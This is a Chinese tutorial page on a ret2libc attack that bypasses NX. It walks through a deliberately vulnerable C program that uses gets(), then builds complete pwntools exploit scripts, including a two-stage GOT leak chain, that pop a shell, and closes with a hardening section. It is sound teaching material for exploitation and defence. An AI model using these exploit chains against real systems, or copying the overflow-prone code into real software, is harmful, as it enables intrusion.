---
title: "案例二：ret2libc 绕过NX保护"
type: docs
weight: 2
---

## 案例二：ret2libc — 绕过NX保护

在案例一中，我们利用栈可执行的特性直接注入shellcode获取shell。然而，现实中几乎所有现代操作系统和编译器默认开启NX（No-eXecute）保护，栈和堆上的数据不可执行。当shellcode注入这条路被封死时，ret2libc（Return-to-libc）是最经典、最直接的绕过方案。

### 技术背景：为什么需要ret2libc

#### NX保护的机制与限制

NX位（也称DEP，Data Execution Prevention）是CPU层面的内存保护机制。操作系统通过页表项中的NX位标记哪些内存页可以执行代码、哪些只能存储数据：

```text
┌──────────────────────────────────────────────────┐
│              进程内存页属性                        │
├────────────┬──────────────┬──────────────────────┤
│  内存区域   │  读/写权限    │  执行权限             │
├────────────┼──────────────┼──────────────────────┤
│  .text     │  只读        │  ✓ 可执行             │
│  .data     │  读写        │  ✗ 不可执行           │
│  .bss      │  读写        │  ✗ 不可执行           │
│  栈        │  读写        │  ✗ 不可执行           │
│  堆        │  读写        │  ✗ 不可执行           │
│  mmap区域  │  取决于flags │  取决于flags          │
└────────────┴──────────────┴──────────────────────┘
```

当程序试图执行NX区域中的代码时，CPU会触发页错误（Page Fault），操作系统收到信号后向进程发送`SIGSEGV`，程序崩溃。

NX保护的局限性在于：它只阻止了"数据段当代码执行"这一条路，但已经加载到内存中的合法代码（如libc中的`system`、`execve`等函数）依然可以被调用。ret2libc正是利用了这一点——不注入新代码，而是复用已有的库函数。

#### ret2libc的核心思想

ret2libc的核心思路是：将栈上的返回地址覆盖为libc中某个有用函数的地址，让程序"返回"到该函数去执行。最典型的目标就是`system("/bin/sh")`。

```text
正常执行流：
  vuln() → 返回地址 → main() 的下一条指令

ret2libc劫持后：
  vuln() → pop rdi; ret → "/bin/sh"地址 → system() → 获得shell
```

关键难点在于两点：第一，libc的加载地址受ASLR随机化影响，每次运行都不同，需要先泄露或计算出真实地址；第二，x86_64架构下函数参数通过寄存器传递（rdi、rsi、rdx...），需要找到控制寄存器的gadget。

### 漏洞程序分析

```c
// vuln2.c
#include <stdio.h>

void vuln() {
    char buffer[64];
    gets(buffer);           // 栈溢出漏洞：无长度限制
}

int main() {
    // 模拟信息泄露：直接打印system函数的真实地址
    printf("libc system: %p\n", system);
    vuln();
    return 0;
}
```

编译命令：

```bash
gcc -o vuln2 vuln2.c -fno-stack-protector -no-pie
```

各编译选项的含义和效果：

| 选项 | 含义 | 本案例中的作用 |
|------|------|----------------|
| `-fno-stack-protector` | 禁用栈保护（Canary） | 防止溢出被Canary检测拦截 |
| `-no-pie` | 禁用PIE（固定加载地址） | 程序自身代码段地址固定，gadget地址稳定 |
| （默认开启NX） | 栈不可执行 | 迫使我们使用ret2libc而非shellcode |

验证保护状态：

```bash
$ checksec --file=vuln2
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled          # ← NX开启，栈不可执行
    PIE:      No PIE              # ← 程序地址固定
    RWX:      Has RWX segments
```

程序的保护矩阵分析：

- **Canary 关闭**：可以直接覆盖返回地址，无需绕过栈保护
- **NX 开启**：不能在栈上放shellcode执行，必须复用已有代码
- **PIE 关闭**：程序中的gadget地址（如`pop rdi; ret`）是固定的，可以直接使用
- **ASLR 开启（系统默认）**：libc基地址随机，需要泄露计算

这个场景代表了CTF和实际漏洞利用中最常见的基本配置：有信息泄露 + NX + 无PIE。

### 利用过程详解

#### 第一步：确定栈溢出偏移量

溢出偏移量是从buffer起始位置到返回地址（saved RIP）之间的字节数。本例中buffer为64字节，加上8字节的saved RBP，偏移量为72字节。

精确确认偏移的方法：

```bash
# 方法一：pattern工具（推荐）
$ python3 -c "from pwn import *; print(cyclic(100))" | ./vuln2
# 在GDB中查看崩溃时RIP的值，然后：
$ python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"

# 方法二：手动计算
# buffer[64] + saved RBP[8] = 72字节
```

#### 第二步：泄露libc地址并计算基地址

程序主动打印了`system`函数的运行时地址，我们只需解析输出即可：

```python
p.recvuntil(b'system: ')
system_addr = int(p.recvline().strip(), 16)
```

有了`system`的真实地址和libc文件中`system`的偏移量，就能算出libc的加载基地址：

```text
libc基地址 = system真实地址 - system在libc中的偏移量
```

```python
libc_base = system_addr - libc.symbols['system']
```

**为什么这一步至关重要？** ASLR虽然随机化了libc的加载基地址，但libc内部函数之间的相对偏移是固定的（因为libc.so文件没有重新编译）。只要知道任意一个函数的真实地址，就能推算出整个libc的布局。这就是"信息泄露"在漏洞利用中的核心价值——它是破解ASLR的钥匙。

#### 第三步：定位"/bin/sh"字符串

`system()`需要一个字符串参数。我们有两个选择：

1. 在libc中搜索已有的`"/bin/sh"`字符串
2. 在程序的可写段中提前布置该字符串

推荐方法一，因为libc中确实包含这个字符串（glibc为了支持`system()`调用本身就需要它）：

```python
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
```

也可以在终端中直接验证libc中存在该字符串：

```bash
$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
 1b75aa /bin/sh
```

#### 第四步：查找控制RDI的Gadget

x86_64架构下，函数第一个参数通过`rdi`寄存器传递。要调用`system("/bin/sh")`，必须在跳转到`system`之前让`rdi`指向`"/bin/sh"`字符串。这需要一个`pop rdi; ret`指令序列：

```bash
$ ROPgadget --binary ./vuln2 | grep "pop rdi"
0x0000000000401243 : pop rdi ; ret
```

使用pwntools自动搜索：

```python
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
```

#### 第五步：构造ROP Payload

将所有组件组装成最终的payload：

```text
栈布局（从低地址到高地址）：
┌────────────────────────────────────────┐
│  'A' × 72 字节（填充buffer + RBP）     │  ← 偏移填充
├────────────────────────────────────────┤
│  0x401243        (pop rdi; ret地址)     │  ← 覆盖返回地址
├────────────────────────────────────────┤
│  bin_sh_addr     ("/bin/sh"地址)        │  ← pop到rdi中
├────────────────────────────────────────┤
│  system_addr     (system函数地址)       │  ← ret跳转到system
├────────────────────────────────────────┤
│  0x0             (可选：伪造的返回地址)  │  ← system返回后的行为
└────────────────────────────────────────┘
```

执行流程解析：

```text
1. vuln() 执行 ret → 从栈弹出 0x401243，跳转到 pop rdi; ret
2. pop rdi       → 从栈弹出 bin_sh_addr 到 rdi
3. ret           → 从栈弹出 system_addr，跳转到 system
4. system("/bin/sh") → 执行，获得shell
```

### 完整Exploit代码

```python
#!/usr/bin/env python3
"""
ret2libc exploit for vuln2 - 绕过NX保护
前提：程序泄露了system地址，PIE关闭
"""
from pwn import *

# ========== 配置 ==========
context.arch = 'amd64'
context.os = 'linux'

p = process('./vuln2')
elf = ELF('./vuln2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# ========== 第一步：泄露system地址 ==========
p.recvuntil(b'system: ')
system_addr = int(p.recvline().strip(), 16)
log.success(f"system @ {hex(system_addr)}")

# ========== 第二步：计算libc基地址 ==========
libc_base = system_addr - libc.symbols['system']
log.success(f"libc base @ {hex(libc_base)}")

# ========== 第三步：计算/bin/sh地址 ==========
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
log.success(f"/bin/sh @ {hex(bin_sh_addr)}")

# ========== 第四步：查找gadget ==========
pop_rdi_ret = 0x401243  # pop rdi; ret
log.success(f"pop rdi; ret @ {hex(pop_rdi_ret)}")

# ========== 第五步：构造payload ==========
offset = 72
payload = b'A' * offset
payload += p64(pop_rdi_ret)   # 控制 rdi
payload += p64(bin_sh_addr)   # rdi = "/bin/sh"
payload += p64(system_addr)   # 调用 system("/bin/sh")

# ========== 发送payload ==========
p.sendline(payload)
log.success("Payload sent, dropping to interactive shell...")
p.interactive()
```

运行效果：

```bash
$ python3 exploit.py
[*] '/tmp/vuln2'
    Arch:     amd64-64-little
[+] system @ 0x7f8a2b4c5420
[+] libc base @ 0x7f8a2b444000
[+] /bin/sh @ 0x7f8a2b5b75aa
[+] pop rdi; ret @ 0x401243
[+] Payload sent, dropping to interactive shell...
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
```

### 关键细节与常见问题

#### 偏移量计算的陷阱

偏移量不是简单地等于buffer大小。影响偏移量的因素包括：

- **编译器对齐（Alignment）**：编译器可能在buffer和saved RBP之间插入填充字节。例如声明`char buffer[64]`，但编译器可能分配80字节栈空间
- **栈对齐要求**：x86_64要求栈16字节对齐，编译器可能额外调整
- **函数中其他局部变量**：如果有多个局部变量，它们在栈上的排列顺序由编译器决定

最可靠的方法是用`cyclic`模式实际测试：

```python
# 用GDB确认
p = process('./vuln2')
p.recvuntil(b'system: ')
p.recvline()
p.sendline(cyclic(200))
p.wait()
# 用 core file 查看 RIP 被覆盖为什么值
# cyclic_find(被覆盖的值) 就是偏移量
```

#### libc版本匹配

**严重警告**：如果exploit使用的libc文件与目标程序运行时链接的libc不一致，所有偏移量都会错，exploit必然失败。确认libc版本的方法：

```bash
# 查看目标程序链接的libc
$ ldd ./vuln2
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6

# 查看libc版本
$ /lib/x86_64-linux-gnu/libc.so.6
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3) stable release version 2.35.

# 或者用pwnlib获取
$ python3 -c "from pwn import *; print(ELF('/lib/x86_64-linux-gnu/libc.so.6').buildid.hex())"
```

在CTF比赛中，通常会提供题目对应的libc文件。在实际渗透中，需要尽可能获取目标机器上的libc版本。

#### 栈对齐问题

x86_64的System V ABI要求在执行`call`指令时栈指针16字节对齐。如果ROP链跳转到`system()`时栈未对齐，可能导致段错误。解决方法是在ROP链中多加一个`ret`指令作为"对齐垫片"：

```python
ret_gadget = 0x401244  # ret指令的地址（pop rdi; ret中的ret）

payload = b'A' * offset
payload += p64(ret_gadget)    # 额外的ret，修正栈对齐
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_addr)
payload += p64(system_addr)
```

不是所有情况都需要这个垫片，但当你遇到"payload构造正确但崩溃"的情况时，栈对齐是最先要排查的原因。

### 变体场景：无直接信息泄露

上面的案例中程序主动泄露了`system`地址，这是最理想的情况。实际漏洞利用中，信息泄露往往需要攻击者主动构造。下面介绍几种常见的泄露方法。

#### 方法一：利用puts/printf泄露GOT表

当PIE关闭时，GOT表地址固定。如果程序调用过`puts`或`printf`，GOT表中存储了这些函数的真实地址。我们可以构造ROP链先调用`puts(puts@got)`打印地址，再重新执行漏洞函数，第二轮利用时用泄露的地址计算libc基地址。

```python
# 第一阶段：泄露puts的真实地址
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
vuln_addr = elf.symbols['vuln']  # 或 vuln 函数的地址
pop_rdi_ret = 0x401243

payload1 = b'A' * offset
payload1 += p64(pop_rdi_ret)
payload1 += p64(puts_got)        # rdi = puts@got
payload1 += p64(puts_plt)        # 调用 puts(puts@got)
payload1 += p64(vuln_addr)       # 返回到 vuln()，再次触发溢出

p.sendline(payload1)
p.recvuntil(b'system: ')
p.recvline()
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
log.success(f"puts @ {hex(leaked)}")

# 第二阶段：用泄露的地址计算libc基地址，完成利用
libc_base = leaked - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

payload2 = b'A' * offset
payload2 += p64(pop_rdi_ret)
payload2 += p64(bin_sh_addr)
payload2 += p64(system_addr)

p.sendline(payload2)
p.interactive()
```

这种方法的核心模式是"泄露 → 返回漏洞点 → 再次利用"，是PWN中最基础也最重要的套路。

#### 方法二：利用格式化字符串泄露

如果程序同时存在格式化字符串漏洞，可以直接通过`%p`或`%lx`泄露栈上的libc地址（栈上通常残留着libc函数的返回地址）。

#### 方法三：利用__libc_start_main的返回地址

`main`函数是被`__libc_start_main`调用的，因此栈上残留着`__libc_start_main`的返回地址。通过计算其相对于栈帧的位置，可以用格式化字符串或部分读取来泄露。

### 进阶话题

#### one_gadget：一发入魂

传统ret2libc需要同时控制`rdi`和找到`system`函数。`one_gadget`是libc中已经存在的"直接执行`execve("/bin/sh", ...)`"的代码片段，只需要跳转过去，甚至不需要设置参数：

```bash
$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0xe3b01 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0xe3b04 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [[rsp+0x40]] == NULL

0xe3b28 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [[rsp+0x40]] == NULL
```

使用one_gadget可以简化ROP链，但需要满足特定的栈约束条件。不满足时可以通过调整栈布局（如多pop几次）来满足条件。

#### ret2libc vs ROP链 vs SROP 对比

| 特性 | ret2libc | 完整ROP链 | SROP |
|------|----------|-----------|------|
| 复杂度 | 低 | 中-高 | 中 |
| 适用场景 | 调用单个库函数 | 任意复杂操作 | 系统调用 |
| 依赖条件 | 信息泄露 + 1个gadget | 多个gadget | sigreturn片段 |
| 参数控制 | 有限（通常3个参数） | 任意 | 完整（所有寄存器） |
| 典型用途 | `system("/bin/sh")` | `open+read+write` | `execve` |

#### 防御视角：如何加固

从防御方的角度，单一保护机制不足以阻止ret2libc：

- **ASLR + PIE**：两者同时开启，程序和库的地址都随机化，增加泄露难度
- **Full RELRO**：防止通过GOT表劫持间接调用
- **Stack Canary**：阻止直接的栈溢出覆盖返回地址
- **CFI（控制流完整性）**：验证间接跳转的目标合法性
- **Shadow Stack（影子栈）**：Intel CET技术，硬件级别的返回地址保护

然而，这些防御并非不可绕过。信息泄露漏洞（格式化字符串、越界读等）配合ROP技术，可以逐一突破上述防护。安全是一个"纵深防御"的问题，没有任何单一机制是银弹。

### 本案例的知识图谱

```text
ret2libc攻击链
├── 前置知识
│   ├── 栈溢出原理（案例一）
│   ├── 函数调用约定（x86_64: rdi/rsi/rdx传递参数）
│   ├── ELF文件格式（PLT/GOT表机制）
│   └── ASLR机制与libc加载
├── 关键步骤
│   ├── 1. 确定溢出偏移量（cyclic工具）
│   ├── 2. 泄露/获取libc地址（信息泄露或程序输出）
│   ├── 3. 计算libc基地址（真实地址 - 静态偏移）
│   ├── 4. 定位目标函数和字符串（system + "/bin/sh"）
│   ├── 5. 查找gadget（pop rdi; ret）
│   └── 6. 构造ROP payload
├── 常见坑点
│   ├── libc版本不匹配
│   ├── 偏移量计算错误
│   ├── 栈未对齐导致崩溃
│   └── one_gadget约束不满足
└── 扩展方向
    ├── 多阶段泄露（puts泄露GOT → 再利用）
    ├── one_gadget简化利用
    ├── ret2csu通用gadget
    └── Full RELRO下的替代方案
```

***
